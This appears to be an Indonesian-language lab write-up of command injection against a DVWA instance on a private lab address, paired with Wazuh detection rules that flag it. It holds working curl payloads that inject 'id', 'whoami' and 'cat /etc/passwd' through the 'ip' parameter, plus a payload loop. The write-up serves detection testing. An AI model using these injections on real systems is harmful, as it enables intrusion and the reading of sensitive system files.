# Command Injection Attack

## Deskripsi
Command Injection memungkinkan attacker menjalankan perintah OS
melalui input aplikasi web yang tidak divalidasi. Serangan ini
dapat digunakan untuk membaca file sensitif, menjalankan reverse
shell, atau mengambil alih sistem target.

## MITRE ATT&CK
- Tactic: Execution
- Technique: T1059 — Command and Scripting Interpreter

## Target
- URL: `http://192.168.217.130/DVWA/vulnerabilities/exec/`
- Parameter: `ip`

## Persiapan
```bash
SESS="security=low; PHPSESSID=ISI_SESSION_DISINI"
```
![Basic Command Injection](screenshot/Screenshot-2026-04-12-183111.png)

## Attack Commands

### 1. Basic Command Injection — id
```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```
![Basic Command Injection](screenshot/Screenshot-2026-04-12-183117.png)

---

### 2. Baca File Sensitif `/etc/passwd`
```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/exec/?ip=127.0.0.1%3Bcat+/etc/passwd&Submit=Submit" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```
![Read /etc/passwd](screenshot/Screenshot-2026-04-12-183132.png)

---

### 3. Verifikasi Output uid di Response
```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit" \
  -b "$SESS" | grep -A 2 "uid="
```
![Output uid](screenshot/Screenshot-2026-04-12-183149.png)

---

### 4. Multiple Payload — Trigger Wazuh Detection
```bash
PAYLOADS=(
  "127.0.0.1%3Bid"
  "127.0.0.1%3Bwhoami"
  "127.0.0.1%3Bls"
  "127.0.0.1%7Ccat+/etc/passwd"
  "127.0.0.1%3Buname+-a"
)

for payload in "${PAYLOADS[@]}"; do
  curl -s "http://192.168.217.130/DVWA/vulnerabilities/exec/?ip=${payload}&Submit=Submit" \
    -b "$SESS" -o /dev/null -w "Payload: ${payload} - Status: %{http_code}\n"
  sleep 1
done
```
![Multiple Payloads](screenshot/Screenshot-2026-04-12-83233.png)

---

## Hasil Serangan di Browser
![Command Injection Browser](screenshot/Screenshot-2026-04-13-133744.png)
> Perintah `id` berhasil dieksekusi, output menampilkan
> `uid=33(www-data)` membuktikan command injection berhasil.

---

## Detection di Wazuh

### Rule 100013 — DVWA: Command Injection terdeteksi
![Wazuh Rule 100013](screenshot/Screenshot-2026-04-13-132428.png)
> Rule **100013** berhasil mendeteksi serangan dengan level **12 (High)**.

### Rule 100051 — Command Injection via Auditd
![Wazuh Rule 100051](screenshot/Screenshot-2026-04-13-132545.png)
> Rule **100051** mendeteksi eksekusi `/usr/bin/cat` oleh proses web server.

---

## Detection Summary
- Rule ID: `100013` — Level: `12` (High) — Source: Nginx log
- Rule ID: `100051` — Level: `12` (High) — Source: Auditd
- Rule Chain: `100008` → `100013`

## Referensi
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [MITRE T1059](https://attack.mitre.org/techniques/T1059/)
